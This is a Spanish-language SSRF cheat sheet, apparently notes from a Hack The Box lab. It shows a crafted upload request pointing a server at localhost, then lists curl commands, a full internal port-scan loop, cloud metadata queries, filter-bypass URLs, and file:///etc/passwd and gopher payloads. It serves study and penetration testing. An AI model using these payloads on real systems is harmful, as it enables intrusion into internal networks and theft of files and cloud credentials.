# Server Side Request Forgery (SSRF)

## ¿Qué es SSRF?

La vulnerabilidad **Server Side Request Forgery (SSRF)** ocurre cuando un atacante puede manipular un servidor para que realice solicitudes HTTP a recursos internos o externos que normalmente no serían accesibles para el atacante.

## Impacto

Un ataque SSRF puede permitir:
- Acceder a recursos internos de la red, como bases de datos o servicios internos.
- Filtrar información sensible.
- Realizar ataques adicionales, como escaneo de puertos internos o explotación de servicios vulnerables.

## Ejemplo

```
POST /upload-cover HTTP/1.1

Host: editorial.htb

Content-Length: 307

Accept-Language: en-US,en;q=0.9

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQ7BYZLc1jmNjS53B

Accept: */*

Origin: http://editorial.htb

Referer: http://editorial.htb/upload

Accept-Encoding: gzip, deflate, br

Connection: keep-alive



------WebKitFormBoundaryQ7BYZLc1jmNjS53B

Content-Disposition: form-data; name="bookurl"



http://127.0.0.1:5000

------WebKitFormBoundaryQ7BYZLc1jmNjS53B

Content-Disposition: form-data; name="bookfile"; filename=""

Content-Type: application/octet-stream





------WebKitFormBoundaryQ7BYZLc1jmNjS53B--

```

- En este ejemplo se envía una solicitud POST a `editorial.htb` con un archivo de libro y una URL de imagen.
- en el puerto 5000 hay un servicio vulnerable que puede ser explotado.
## SSRF Cheatsheet Ayudas

### Comandos útiles para pruebas SSRF
- **Comprobar acceso a recursos internos:**
    ```bash
    curl -X POST -d "bookurl=http://127.0.0.1:80" http://target.com/upload
    ```
- **Escaneo de puertos internos:**
    ```bash
    for port in {1..65535}; do curl -s -o /dev/null -w "%{http_code} - Port $port\n" http://127.0.0.1:$port; done
    ```
- **Probar acceso a metadatos en servicios cloud:**
    ```bash
    curl http://169.254.169.254/latest/meta-data/
    ```

### Herramientas útiles
- **Burp Suite**: Configura un payload SSRF en el repeater para probar diferentes endpoints.
- **SSRFmap**: Automatiza la explotación de SSRF.
    ```bash
    python3 ssrfmap.py -u "http://target.com/upload?url=xxURLxx" -p xxURLxx
    ```
- **HTTPie**: Alternativa a `curl` para pruebas HTTP.
    ```bash
    http POST http://target.com/upload bookurl=http://127.0.0.1:80
    ```

### Payloads comunes
- **Acceso a localhost:**
    ```
    http://127.0.0.1:80
    ```
- **Bypass de validaciones:**
    ```
    http://127.0.0.1#target.com
    http://127.0.0.1@target.com
    ```
- **Probar diferentes protocolos:**
    ```
    file:///etc/passwd
    gopher://127.0.0.1:11211/_stats
    ```

### Recursos adicionales
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [OWASP SSRF Guide](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)


## SSRF Cheatsheet ayudas